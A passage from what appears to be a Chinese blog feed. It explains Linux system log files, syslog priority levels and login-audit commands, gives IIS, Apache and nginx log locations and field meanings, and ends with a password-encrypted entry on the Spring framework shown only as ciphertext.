ringbuffer）。在系统启动时，显示屏幕上的与硬件有关的信息</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;dpkg.log  - 包括安装或dpkg命令清除软件包的日志。</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;faillog    - 包含用户登录失败信息。此外，错误登录命令也会记录在本文件中。</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;fontconfig.log -与字体配置有关的log。</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;fsck    - 文件系统日志</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;faillog  -包含用户登录失败信息。此外，错误登录命令也会记录在本文件中。</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;kern.log –包含内核产生的日志，有助于在定制内核时解决问题。</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;lastlog —记录所有用户的最近信息。这不是一个ASCII文件，因此需要用lastlog命令查看内容。</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;faillog –包含用户登录失败信息。此外，错误登录命令也会记录在本文件中。</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;mail&#x2F; – 这个子目录包含邮件服务器的额外日志。</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;samba&#x2F; –包含由samba存储的信息。</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;wtmp —包含登录信息。使用wtmp可以找出谁正在登陆进入系统，谁使用命令显示这个文件或信息等。</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;xorg.*.log— 来自X的日志信息。</span><br></pre></td></tr></table></figure><h4 id="日志的优先级别"><a href="#日志的优先级别" class="headerlink" title="日志的优先级别"></a>日志的优先级别</h4><table><thead><tr><th align="center">级别</th><th align="left">英文单词</th><th align="left">中文释义</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">0</td><td align="left">EMERG</td><td align="left">紧急</td><td align="left">会导致主机系统不可用的情况</td></tr><tr><td align="center">1</td><td align="left">ALERT</td><td align="left">警告</td><td align="left">必须马上采取措施解决的问题</td></tr><tr><td align="center">2</td><td align="left">CRIT</td><td align="left">严重</td><td align="left">比较严重的情况</td></tr><tr><td align="center">3</td><td align="left">ERR</td><td align="left">错误</td><td align="left">运行出现错误</td></tr><tr><td align="center">4</td><td align="left">WARNING</td><td align="left">提醒</td><td align="left">可能影响系统功能，需要提醒用户的重要事件</td></tr><tr><td align="center">5</td><td align="left">NOTICE</td><td align="left">注意</td><td align="left">不会影响正常功能，但是需要注意的事件</td></tr><tr><td align="center">6</td><td align="left">INFO</td><td align="left">信息</td><td align="left">一般信息</td></tr><tr><td align="center">7</td><td align="left">DEBUG</td><td align="left">调试</td><td align="left">程序或系统调试信息等</td></tr></tbody></table><p>数字等级越小，优先级越高，消息越重要。</p><h4 id="三种日志类型"><a href="#三种日志类型" class="headerlink" title="三种日志类型"></a>三种日志类型</h4><p><strong>内核及系统日志：</strong></p><p>这种日志数据由系统服务<code>rsyslog</code>统一管理，根据其主配置文件<code>/etc/rsyslog.conf</code>中的设置决定将内核消息及各种系统程序消息记录到什么位置。系统中有相当一部分程序会把自己的日志文件交由<code>rsyslog</code>管理，因而这些程序使用的日志记录也具有相似的格式。</p><p><strong>用户日志：</strong></p><p>这种日志数据用于记录<code>Linux</code>操作系统用户登录及退出系统的相关信息，包括用户名、登录的终端、登录时间、来源主机、正在使用的进程操作等。</p><p><strong>程序日志：</strong></p><p>有些应用程序会选择由自己独立管理一份日志文件（而不是交给<code>rsyslog</code>服务管理），用于记录本程序运行过程中的各种事件信息。由于这些程序只负责管理自己的日志文件，因此不同程序所使用的日志记录格式可能会存在较大的差异。</p><h4 id="一些命令"><a href="#一些命令" class="headerlink" title="一些命令"></a>一些命令</h4><p><strong>users</strong></p><p><code>users</code>命令只是简单地输出当前登录的用户名称，每个显示的用户名对应一个登录会话。如果一个用户有不止一个登录会话，那他的用户名将显示与其相同的次数。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu-virtual-machine:~$ users</span><br><span class="line">ubuntu</span><br></pre></td></tr></table></figure><p><strong>who</strong></p><p><code>who</code>命令用于报告当前登录到系统中的每个用户的信息。使用该命令，系统管理员可以查看当前系统存在哪些不合法用户，从而对其进行审计和处理。<code>who</code>的默认输出包括用户名、终端类型、登录日期及远程主机。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu-virtual-machine:~$ who</span><br><span class="line">ubuntu   tty7         2020-02-03 03:50 (:0)</span><br></pre></td></tr></table></figure><p><strong>w</strong></p><p><code>w</code>命令用于显示当前系统中的每个用户及其所运行的进程信息，比<code>users</code>、<code>who</code>命令的输出内容要丰富一些。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@MoonBack:~<span class="comment"># w</span></span><br><span class="line"> 14:26:21 up 86 days,  5:32,  2 users,  load average: 0.02, 0.06, 0.02</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">root     pts/0    127.0.0.1     13:43   42:53   0.54s  0.02s -bash</span><br><span class="line">root     pts/1    127.0.0.1     14:22    0.00s  0.02s  0.00s w</span><br></pre></td></tr></table></figure><p><strong>last</strong></p><p><code>last</code>命令用于查询成功登录到系统的用户记录，最近的登录情况将显示在最前面。通过<code>last</code>命令可以及时掌握<code>Linux</code>主机的登录情况，若发现未经授权的用户登录过，则表示当前主机可能已被入侵。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@MoonBack:~<span class="comment"># last</span></span><br><span class="line">root     pts/1        127.0.0.1   Wed Feb 19 14:22   still logged <span class="keyword">in</span></span><br><span class="line">root     pts/1        127.0.0.1   Wed Feb 19 14:04 - 14:09  (00:04)</span><br><span class="line">root     pts/0        127.0.0.1   Wed Feb 19 13:43   still logged <span class="keyword">in</span></span><br></pre></td></tr></table></figure><p><strong>lastb</strong></p><p><code>lastb</code>命令用于查询登录失败的用户记录，如登录的用户名错误、密码不正确等情况都将记录在案。登录失败的情况属于安全事件，因为这表示可能有人在尝试猜解你的密码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@MoonBack:~<span class="comment"># lastb</span></span><br><span class="line">user     ssh:notty    113.163.171.134  Wed Feb 19 05:39 - 05:39  (00:00)</span><br><span class="line">user     ssh:notty    113.163.171.134  Wed Feb 19 05:39 - 05:39  (00:00)</span><br><span class="line">admin    ssh:notty    14.169.178.174   Wed Feb 19 01:19 - 01:19  (00:00)</span><br><span class="line">admin    ssh:notty    14.169.178.174   Wed Feb 19 01:19 - 01:19  (00:00)</span><br><span class="line">admin    ssh:notty    14.169.178.174   Wed Feb 19 01:19 - 01:19  (00:00)</span><br><span class="line">admin    ssh:notty    14.169.178.174   Wed Feb 19 01:19 - 01:19  (00:00)</span><br></pre></td></tr></table></figure><p><strong>awk</strong></p><p><code>awk</code>是一个强大的文本分析工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">last -n 5 | awk  <span class="string">&#x27;&#123;print $1&#125;&#x27;</span><span class="comment">#显示最近登陆的5个用户,$1实指传过来的第一个参数</span></span><br><span class="line">awk -F <span class="string">&#x27;/&#x27;</span>  <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> <span class="built_in">log</span> | head -10<span class="comment">#对log文件用/分割取前10行的第一列</span></span><br><span class="line">awk <span class="string">&#x27;&#123;print substr($1,5,5)&#125;&#x27;</span> <span class="built_in">log</span> | tail -10 <span class="comment">#截取第一列后10行从第五个字符开始的五个字符</span></span><br></pre></td></tr></table></figure><h2 id="web日志"><a href="#web日志" class="headerlink" title="web日志"></a>web日志</h2><h3 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h3><h4 id="日志位置"><a href="#日志位置" class="headerlink" title="日志位置"></a>日志位置</h4><p>IIS的日志文件默认目录为<code>C:\inetpub\logs\LogFiles</code>，可通过<code>Internet Information Services(IIS)</code>管理器查看，默认采用<strong>W3C</strong>格式</p><img src="/2020/02/18/%E6%97%A5%E5%BF%97%E5%92%8C%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/TIM截图20200219155033.png" style="zoom:80%;"><img src="/2020/02/18/%E6%97%A5%E5%BF%97%E5%92%8C%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/TIM截图20200219155513.png" style="zoom:80%;"><h4 id="Log-Parser-Studio"><a href="#Log-Parser-Studio" class="headerlink" title="Log Parser Studio"></a>Log Parser Studio</h4><ol><li><p>需要先安装<code>Log Parser</code><br>下载地址：<a href="http://www.microsoft.com/en-us/download/details.aspx?displaylang=en&id=24659">http://www.microsoft.com/en-us/download/details.aspx?displaylang=en&amp;id=24659</a></p></li><li><p>安装<code>Log Parser Studio</code></p><p>下载地址：<a href="http://gallery.technet.microsoft.com/Log-Parser-Studio-cd458765">http://gallery.technet.microsoft.com/Log-Parser-Studio-cd458765</a></p></li></ol><p>安装完成第一个文件之后，解压第二个文件，直接运行LPS.exe即可。</p><img src="/2020/02/18/%E6%97%A5%E5%BF%97%E5%92%8C%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/TIM截图20200219194535.png" style="zoom:80%;"><p>新建一个查询</p><img src="/2020/02/18/%E6%97%A5%E5%BF%97%E5%92%8C%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/TIM截图20200219195013.png" style="zoom:80%;"><p>将<code>[LOGFILEPATH]</code>替换成日志的路径</p><img src="/2020/02/18/%E6%97%A5%E5%BF%97%E5%92%8C%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/TIM截图20200219195437.png" style="zoom:80%;"><p>就可以变成直观的表格形式了</p><p><strong>字段前缀说明：</strong></p><table><thead><tr><th align="center">前缀</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">s-</td><td align="center">服务器操作</td></tr><tr><td align="center">c-</td><td align="center">客户端操作</td></tr><tr><td align="center">cs-</td><td align="center">客户端到服务器的操作</td></tr><tr><td align="center">sc-</td><td align="center">服务器到客户端的操作</td></tr></tbody></table><p><strong>各个字段说明：</strong></p><table><thead><tr><th align="center">字段</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">date</td><td align="center">日期，表示活动发生的日期。</td></tr><tr><td align="center">time</td><td align="center">时间，表示活动发生的时间。</td></tr><tr><td align="center">s-sitename</td><td align="center">服务名，表示客户端所访问的该站点的 Internet 服务和实例的号码。</td></tr><tr><td align="center">s-computername</td><td align="center">服务器名，表示生成日志项的服务器名称。</td></tr><tr><td align="center">s-ip</td><td align="center">服务器IP，表示生成日志项的服务器的IP地址。</td></tr><tr><td align="center">cs-method</td><td align="center">方法，例如GET或POST。</td></tr><tr><td align="center">cs-uri-stem</td><td align="center">URI资源，表示请求访问的地址。</td></tr><tr><td align="center">cs-uri-query</td><td align="center">URI查询，表示查询HTTP请求中问号（?）后的信息。</td></tr><tr><td align="center">s-port</td><td align="center">服务器端口，表示客户端连接的服务器端口号。</td></tr><tr><td align="center">cs-username</td><td align="center">通过验证的域或用户名，对于通过身份验证的用户，格式是<code>域\用户名</code>；对于匿名用户，是一个连字符 (-)。</td></tr><tr><td align="center">c-ip</td><td align="center">客户端IP，表示访问服务器的客户端真实IP 地址。</td></tr><tr><td align="center">cs-version</td><td align="center">协议版本，例如 HTTP 1.0 或 HTTP 1.1。</td></tr><tr><td align="center">user-agent</td><td align="center">用户代理，表示在客户端使用的浏览器。</td></tr><tr><td align="center">Cookie</td><td align="center">Cookie，表示发送或接受的Cookie内容，如果没有Cookie，则显示连字符（-）。</td></tr><tr><td align="center">referer</td><td align="center">引用站点，表示用户访问的前一个站点。此站点提供到当前站点到链接。</td></tr><tr><td align="center">cs-host</td><td align="center">主机，表示主机头内容。</td></tr><tr><td align="center">sc-status</td><td align="center">协议返回状态，表示HTTP或FTP的操作状态。</td></tr><tr><td align="center">sc-substatus</td><td align="center">HTTP子协议的状态。</td></tr><tr><td align="center">sc-win32-status</td><td align="center">win32状态，即用 Windows使用的术语表示的操作的状态。</td></tr><tr><td align="center">sc-bytes</td><td align="center">服务器发送字节。</td></tr><tr><td align="center">cs-bytes</td><td align="center">服务器接收字节。</td></tr><tr><td align="center">time-taken</td><td align="center">所用时间，即操作所花时间长短，单位为毫秒。</td></tr></tbody></table><p>更多内容参见：<a href="https://www.alibabacloud.com/help/zh/doc-detail/84813.htm">https://www.alibabacloud.com/help/zh/doc-detail/84813.htm</a></p><h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h3><h4 id="linux日志位置"><a href="#linux日志位置" class="headerlink" title="linux日志位置"></a>linux日志位置</h4><p>如果采用<code>RPM</code>包安装，默认情况下目录/usr 用来存放应用程序，目录<code>/etc/apache2</code>或者<code>/etc/httpd</code>存放软件的配置文件</p><p>如果采用源代码安装，一般默认安装在<code>/usr/local/apache2</code>目录下</p><p>找不到我们可以用find命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name apache2</span><br></pre></td></tr></table></figure><p>这里我用docker搭建的lamp发现日志文件位于<code>/var/log/apache2</code>目录下</p><p><code>access.log</code>记录着http请求</p><img src="/2020/02/18/%E6%97%A5%E5%BF%97%E5%92%8C%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/TIM截图20200219214509.png" style="zoom:80%;"><h4 id="windows日志位置"><a href="#windows日志位置" class="headerlink" title="windows日志位置"></a>windows日志位置</h4><p>安装完<code>apache</code>后目录结构：</p><img src="/2020/02/18/%E6%97%A5%E5%BF%97%E5%92%8C%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1433350-158961037560e2e4.webp.jpg" style="zoom:80%;"><p>日志文件位于<code>logs</code>目录下</p><h3 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h3><h4 id="linux日志位置-1"><a href="#linux日志位置-1" class="headerlink" title="linux日志位置"></a>linux日志位置</h4><img src="/2020/02/18/%E6%97%A5%E5%BF%97%E5%92%8C%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/TIM截图20200219221127.png" style="zoom:80%;"><p>用docker拉取得nginx镜像日志文件位于<code>/var/log/nginx</code>，配置文件位于<code>/etc/nginx</code>，如果不知道也可以也可以find</p><h4 id="windows日志位置-1"><a href="#windows日志位置-1" class="headerlink" title="windows日志位置"></a>windows日志位置</h4><p>目录结构：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">│  nginx.exe</span><br><span class="line">│</span><br><span class="line">├─conf</span><br><span class="line">│      example.conf</span><br><span class="line">│      fastcgi.conf</span><br><span class="line">│      fastcgi_params</span><br><span class="line">│      koi-utf</span><br><span class="line">│      koi-win</span><br><span class="line">│      mime.types</span><br><span class="line">│      nconfig.conf</span><br><span class="line">│      nginx.conf</span><br><span class="line">│      scgi_params</span><br><span class="line">│      uwsgi_params</span><br><span class="line">│      vhosts.conf</span><br><span class="line">│      win-utf</span><br><span class="line">│</span><br><span class="line">├─contrib</span><br><span class="line">│  │  geo2nginx.pl</span><br><span class="line">│  │  README</span><br><span class="line">│  │</span><br><span class="line">│  ├─unicode2nginx</span><br><span class="line">│  │      koi-utf</span><br><span class="line">│  │      unicode-to-nginx.pl</span><br><span class="line">│  │      win-utf</span><br><span class="line">│  │</span><br><span class="line">│  └─vim</span><br><span class="line">│      ├─ftdetect</span><br><span class="line">│      │      nginx.vim</span><br><span class="line">│      │</span><br><span class="line">│      ├─indent</span><br><span class="line">│      │      nginx.vim</span><br><span class="line">│      │</span><br><span class="line">│      └─syntax</span><br><span class="line">│              nginx.vim</span><br><span class="line">│</span><br><span class="line">├─html</span><br><span class="line">│      50x.html</span><br><span class="line">│      index.html</span><br><span class="line">│</span><br><span class="line">├─logs</span><br><span class="line">│      access.log</span><br><span class="line">│      error.log</span><br><span class="line">│      nginx.pid</span><br><span class="line">│</span><br><span class="line">└─temp</span><br><span class="line">    ├─client_body_temp</span><br><span class="line">    ├─fastcgi_temp</span><br><span class="line">    ├─proxy_temp</span><br><span class="line">    ├─scgi_temp</span><br><span class="line">    └─uwsgi_temp</span><br></pre></td></tr></table></figure><h3 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h3><p>和上面的基本一样</p><p>参考：</p><p><a href="https://www.freebuf.com/vuls/175560.html">https://www.freebuf.com/vuls/175560.html</a></p><p><a href="https://xz.aliyun.com/t/2524">https://xz.aliyun.com/t/2524</a></p><p><a href="https://www.cnblogs.com/llife/p/11478952.html">https://www.cnblogs.com/llife/p/11478952.html</a></p><p><a href="https://www.alibabacloud.com/help/zh/doc-detail/84813.htm">https://www.alibabacloud.com/help/zh/doc-detail/84813.htm</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 日志 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring框架入门</title>
      <link href="2020/02/18/Spring%E6%A1%86%E6%9E%B6%E5%85%A5%E9%97%A8/"/>
      <url>2020/02/18/Spring%E6%A1%86%E6%9E%B6%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="您好, 这里需要密码." /><label>您好, 这里需要密码.</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="563b8d1e7723046a89aa633257305f5714226f21538f0db5afc62e39ca1acfa0">350661b2974115f53242674b356f3b8a42f648c389fe6ce9dd086c5d24c940538305548e0c724e64fbe4fd4f661fdc5bacc7858cb28ee4d6d44e5ec47b6e464d31a33970739aa604aa07c5ba41d61a5ce1a27f8ca3fbc311f4424db7b4f3d5f3ae995486d9555c4a7d8a92ab36868334b15713fddead0f613e89a3f156808e4b4e6616c24b86927d84fa418c4f98af1b5998bcb80616b46871b7f0c35ebcfbfe3c7f85376d941c859af05d19fbb9dea676b8d63b6669a72bc2ff87dd6132ceba809fa8ebbb6958636ec26f45baea199f885f04e51cbda9354239a507385b7a4002b145b964a5b5b22e453f56425d482dff899ab5e7a7f950e94859b42e5ea55bdc2155228368c8e3336f321ea0944dc00b9a2b4a9de28ff1b01f4a4b548047f5365a80f3a0defb3e88077a7f32d75e0451139596904a5e35429b3a133e1d070393587caa230b305285e48d6de6de49537b99dc7ee649d417fe5ea36e527a32f6ed746e2335e6b1b5a8c200183153937a23c97f8041ca270d5ddbcfcb9ce281217c7bdf7d39ac4906602da84d85ccc0721c5d912116cd5069ac98e798679b1be8659b688aeff7108367a1b613068495fb08ef80bec3e565df8247a25983ab38becd73e33f6ed98bf698f6f074561edbce553a3ba5d90ed0b9374494230733343c7856757afd11cee999aa1c17e938d8aa6327b999a9f71acffe6578faa8d05e13bb2bddde3e7c8e85d1bdfe7e0521e72f729cae979c2d9132726405499c96857f15ad7ba5c9d495d3d230d57e4daf835ce6b09cd01622ac7ab578470173cbd82468c417ba1f6cce948a59f57059947c7d67de2bb4e5c27f804361904b3e5b0e4a84c3d069c9e1cc1c01a2c482052d908459b2306ce148315232ff4e6ec3044b694c0703d4515805573e3438541615e5fe37fbd0c31852db8d54ada0a09409499bd5d0f79a83e269e1d0a801208987b67a5830a7b184a3a105a722006c2c376eebfaacdb9f8c41823c08b175d21beca68e01e9c0162e0a463ea176bfbdae7e9e15df42869c763b95d2a9aa7609211443d15cbda2dbbdfb76c2897c4db1684e5da8180bda42612f984ed8c0e3cd3ddd7639fc5e65eb85abc51bcf1abc6ec9eb724de5e7ea16c5bf89474c2f062e97cdf670ebe6328feeb8f45018fb8713941af44ff7cc376a56eb4ef51f05e4b1579a3fff08110cc04d479857d88d93fc9f237e347a2197e6306486a86334c035b165f7486a23228d78e83ffdea32a266abb07534dec84a54acdaedb7a24dd61275a8f268a42dd7e1558a64b4857f1bc5d942280a0185e063fee559965119eaf0ce1f308bf6521e12a7606a9408c675dff42c3896f320a85baa31b6e0486f705562f2e0deb0009a8d41c73ee6269de7f609ad92a42c8d07b15c693305a0889e747cc83827d2fffea0de3c2a648a487ec262bb881a2da24ab5ee0104b8ec9bdc1582c652ca0009da585fa41ecf3b1a3d6eddd62122e596685d363933b4c1c4addb4c273e67e5ecd2f6ca3d0d798efc87bb4c110ece0f180a468f16de8fb61401e759a6530e26b6fea75d2b0fec2caf16480decf66cd74187712f4d07362491b1503d2153072b8009c1fd87a776563f45f13836741185d2bd96ace4a883f65cebd21c120f3adac5848f797676de7d74eeeb6614035b33617a4bb9bbb57720a38ff337981080387f9cd70fda9330c97cb411b22c1ee59aca561322e3b535536c117dd58b25a2026c869d92cb0abbd73c6e81218263220f48a725426d3c536181cca5cb0d0c227031e1fac9737be751aff21597e9d5c65d04baa8f0898840c34f6fa619422295dde669086f3a16f463fcbf59a3d0e9b10996b9180ade7dfe81fbed4bb9d3b5c76bd63ac7de097561461f73c178e968a95e0a0ec4ac775cf3a6ca989b0eff18986e423e942ea43022c1d3de642c1354357ece430cddb13fb1610ef7b66f8108d9ca0d352cca7f74a8720be1e0d6bafa883d60cd47a7be961c9e7b5303b69269db18731296f940d83e95cc6c8c01ce217c913667fcd048b4bcf220e9c1469a4efb12a3ddfdf585ecc46ceecd56e2ffc78cc976ea122a511442477a5782c37c1c2aa4c7160ef49df714df63d33797e474dce4dd0a6e9f870953864d88cb7410b2403eae07294ec1327581b6a70eb1db7e3dc4a3ef384432c656e6a15e90b7408f2be4b9387a7d91642a2202df96a01e026e1ddae3dfc337d37a4734f660a5eea358057517e3d4e1d10cceff231676b1d7595136895b2256d15d91796d327b85250b287558606aac9309062e9bcd68412edbc31c397788a4b87e6deaf6df864202447a88cb2a41d1099c638b3165090bedf64767d4efd431ff7e7334e8773b3d32552e5f5bd076176e74dd30da236476e738bbcd82be9f700c82191b60a58d31175fe07b19cee76b248c74419e83d9cde9d793eb094315ae43f1fbc28db6ca01b7487e5ceb7d8aba2a559f159951bb3009146a1566ec561780390d5b86f220ff1cb6a18fdeb360167f5fc5e5d15f35c653016b1a86f90c209dd0c785de3177bf2c5b05f82dfeadd36630aef7f66a1b5c8102f4b0d6c865c9e82d5a585881b48b5defc60a61c5b84e1a2321123ee0b0cc2935dfb379f520cf80844e54adee867cbf51dbabf53d2724d4bcb5f2c7a6ecf5fb814330160b08151b1d8e44dfa26acf0fba0dcdc58c545f25a235818e7ee140248c1884b1e333f5ac361cacb9f149c7e028a7ac38f8d11f8fbc00db4c13f2747b8596a9c54f3bdc9de34fbeddacc8ebbce0066b8759bb622751adffd00f3515c37bb1b553551e56855fa00e73e5dc50097b0d32392eba81f5578ccc29a734e2760517b5e1905bebb2e7fa5ba72d3f142b96378e00e2b1e5260cbffb4194639c599c72b2283a6f4f3ae96ac2261b4ab15cf1ad21aca41dc27e0c66cbc0224781ffd32c7a9f86513b820b88ef1a820dee1516e65608ea129b0bd0bcf34a666f9f963e4864371d915361a0701bdd6e43f39c66ee9830efde6e8fecaad9565dabc9fa49e4f236e234ee9e2b96b11e8188671fd95a0b7885a7559ce986109eb961b1d1413519144b96b2df66ed386006fcfb8744f539f03449bfbfd35b5e9060f1b8252d1375a05e9ba6e2fac657489011a324c7e4aec0e76478beebf95f03b2ab2fdb0c060c8d228094d0c42d76c5358c26d5cc1dd6d6a2b117c49b7a7b4e39010d4c89c8e525a4db44a77785694345aee3f699b292ae8d91bb36ab2a03cbb06f401f79caa4a4dd64e8960da6d147ffe07f3248b1678a630acfd7ab14e29f7de2fa215459341438e7aba79c8de8c3a7a41dd2d8efb0c93067406afe8ce1ff4e0e269e05a2b7dfad2d4ae8526876818aec936c31b03f5f6cadedb4469a68d4eefb85c644458c8f520d1c84122e8a99da31a4cdf7bec4699a425c0a36a54241f19951edcadf03ed553983a5486a4f35efe0d11820168d976fe5efe5a187f6f21bc79be92865d485f3964399a3fcc235e6bd600218627af0d7d1c8a9f4d4cc9d127ce43d2a00dc73a25ea4ad4d12aabb81bf48ed5ff76d4ff49ec1eeb7214c78edd1d69dbac888de3973e4dd0eeb9094346ce7a97826fb2a0c85385bd384a7321afbcdff3cd593996b6b0ad4b84c5199039a9b6a1cbdb573b5349628985aebca79812f883e1458ede5f8beffeaef2e4f46a5962d800cfa1b337c3f163f800c1d730f0aa7703ea82db4e113d9ccc18ffc885e1c0aa0f88e1392a5e7e001dc9adf95b826021c83806346d4ddc9f06386975b9534a0c8a5abb8346f0d42a80aa81705ab7165caf866e5ebc5323c222e92b6ae113336a9e6c987b9c149442c72b3c3662e1f46e370f6b5f24dfc7c6dbccc2cff4ed4631dd05209d6fbfa22c2fd984486916edbbb8da3616606701bc2f06364c04ad2db9af8fb40d8068dadc1df347f5adf62299c63db3af316f9054d9c4d5aec9918be31b6ae3f192d8077f18318188da27788d842f7f6dc5150a9ecbd5b9d2057bd79e09364f4d0ea2eb4330b14c6ce2bc27640f52ce939a6bb7e58bc135da8ab96359b1e61d917a2834b0ce30c0a92b7f2c41eee97718a084975033b4379ff61920bab974dfd2f7cc575fab82341ae81863743c2ace4016f8dd3dae1811917cadd41119caeabd27252137c3049c3743c4481cde34e9b1101fb2153c92dcc0a606fe949a0b96a7bafec22add4101d1017a20562d9ef5cbaa8899d27ad7d6df46a5858c093030514c483e4eae3eb8762233aa4f3950094cb43953d77f86ba6d1696650f375c3d52448d7634a2091381bd9554be211d17cb74a7b9fcdeb0dfcd73ff6710eaba8104452823d2e3bb0f8ba43094b97c9ffd3edd14076f2631bbcbc4eebac5892794897a0ec27e9a920a243823c6b9ab044115df30756cba23bb7e19ff18787a2a11d7a47cb78772bd4f99634acf8aa3dd5dd6176f25e6860d68b1bc051b7e7b5c32b417ba48a4f6b133af779354625af0517fd155b0562984598b38ce9866ffc562f56f4f100f918d36bc258cf605b547a13663ed72e274e40fa30258321307b5ec6ec803b74eb8bf8a444ee5080e2fa06477d8486a2fb0c39fb32e358aaa4862be12f2cb1a2b2cbab2f7253d648c53a49c0e1b5935f90e8dd845634b9da664c0ae3c034eda50dd3a928dd05f652a3028a641f9b99732dcb024dbf316e9f69b6903292ae9ea59d433cbc11a32a1243ee35aed314b34e6b9cf31c8a3a2f88d2fa6eb3c4dd801f53fe95771221d8ce46de656c9ccc3d6ee46290d38a57ebf0b4e4564b37b4ea1bb7b5a288c647ca0fb5e5ef2691fe4109c97396e9f6abb42173543a0a6087fabacd4ae740366034e7b13c1f3bdeeee95f447b6645ab24bbd6ce0d87d1bdb9c25b38a1c629cf6d3b9f6c811e273d2c427345f132b4e8a3a2e4fb5be500b662245e163b1dc1252ac0d6e9a5927ecbcdc4988cf7a7310aa91b6388134f73ce55d93ee74fe2712a77e09cb88392dc54ff14d7eb9f0778e1de686114af0119253f375cbf15b9a3f9696a10f8653c9affc2a099cc2dfb9687d4cd05506fa96a4474445ff4a906b79771a6c6ce260b3bbb2b24f0db4ea17722bf43cc6df3b30a16ac2f41b2c8ce282eea6a823117723439e5b6a2acb78e58724983f7a11dd964273218efc9b3a29ea3146f07cd57243b9cc76bd2ab48c12522a9e443e52e3a21b3031d24dcb49990711a60bed9fd56c47080ccf3b16d0c3e3a69d53d5176ff5238b17b515215d9982e339ecc9b33c269779b1209c204ba7eb1300d1dac27c1a533d98bbd47b2e99030c8e65440130ab765a834a0aded69791a47476ef194a22d52e0dc8c6a511dc394db7af7c984b4d931d33908d3e4f41be7f1b9a6b5bd71343d7921770f986b09881f868c8c6411b603136d7bc95dd5f2e198619a4debf1b3fd867e9f032d79e13d7376a60088e33cc561ccfee22b29543a992fddfa8cb2aaca89b590cf8f12839d599f28bb9804dffdb66f4ec05ac9bbf91539fd4c41a096fe734cb00576fbe5c3466e0b294420654d96c5c9d9f51e3e5b5bd1dcaa93c45085778ce376f4ed220567b1cc442eb19d49ee488aa5574243d8cdcaaa9b34b3889288e986c51e3d685fdfa01f5f0c278c5994675fa6879c9ebb03048968d79623497c773f8d7c3197df7bcd818d57e17ac54fd0bb3af7229d63370b5bd71eee609f9a3203abee402e779c4902d455a493784f3